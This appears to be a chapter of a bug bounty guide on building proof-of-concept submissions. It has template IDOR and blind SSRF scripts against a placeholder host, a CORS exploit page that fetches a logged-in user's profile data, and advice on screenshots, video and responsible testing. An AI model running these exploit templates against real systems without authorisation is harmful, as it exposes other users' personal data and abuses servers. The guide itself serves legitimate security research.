# PoC Creation

A Proof of Concept (PoC) demonstrates that a vulnerability exists and shows its potential impact. A well-crafted PoC can be the difference between a report being accepted or marked as "informative."

## PoC Types

### 1. HTTP Request/Response
Best for simple vulnerabilities (IDOR, Open Redirect, CORS).

```http
GET /api/v1/users/5678/profile HTTP/1.1
Host: target.com
Cookie: session=USER_A_SESSION

HTTP/1.1 200 OK
{ "email": "user_b@target.com", "ssn": "123-45-6789" }
```

### 2. Screenshot
Best for UI-based vulnerabilities (XSS, CSRF, visual bugs).

**Best practices:**
- Annotate with arrows, circles, or highlights
- Redact PII (blur, not black boxes)
- Capture the full flow (before → after)
- Include URL bar to show location

### 3. Video Recording
Best for complex multi-step exploits or race conditions.

- **Tool**: Peek (Linux), OBS (all), QuickTime (Mac), ScreenRec (Windows)
- **Keep it under 2 minutes**
- **Speak over it** — explain what you're doing

### 4. Script-based PoC
Best for automated exploitation or blind vulnerabilities.

```python
import requests

BASE = "https://target.com"
SESSION = "victim_session_cookie"
TARGET_USER = 5678

# Exploit IDOR to read victim data
cookies = {"session": SESSION}
resp = requests.get(f"{BASE}/api/v1/users/{TARGET_USER}/profile", cookies=cookies)

if resp.status_code == 200:
    print("VULNERABLE: Accessed user", TARGET_USER)
    print("Data:", resp.text[:200])
else:
    print("Not vulnerable or access denied")
```

### 5. HTML/JS PoC Page
Best for client-side vulnerabilities (XSS, CORS, CSRF).

```html
<html>
<body>
<h1>CORS Exploit PoC</h1>
<script>
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
}).then(r => r.text())
  .then(data => document.body.innerHTML += '<pre>' + data + '</pre>');
</script>
</body>
</html>
```

## PoC Guidelines

| Do | Don't |
|----|-------|
| Use test accounts | Access real user data |
| Minimize data exfiltration | Mass-harvest data |
| Explain what you're showing | Submit raw logs |
| Redact sensitive info | Share PII or credentials |
| Test in production | Disrupt operations |

## Blind Vulnerability PoCs

For blind XSS, SSRF, or SQLi (time-based/oob):

```python
# Blind SSRF PoC with interactsh
import requests

callback = "YOUR_INTERACTSH_URL"
requests.post("https://target.com/fetch", json={"url": callback})
print("Check interactsh for callback from target server")
```

## Universal PoC Tips

1. **Start simple** — Prove the bug exists first, then escalate
2. **Include the raw request** — Export from Burp
3. **Use test accounts** — Never use real user data
4. **Annotate everything** — Not everyone sees what you see
5. **Make it reproducible** — The triager needs to verify

---

> **Next**: [Triage Interaction](04-triage-interaction.md)
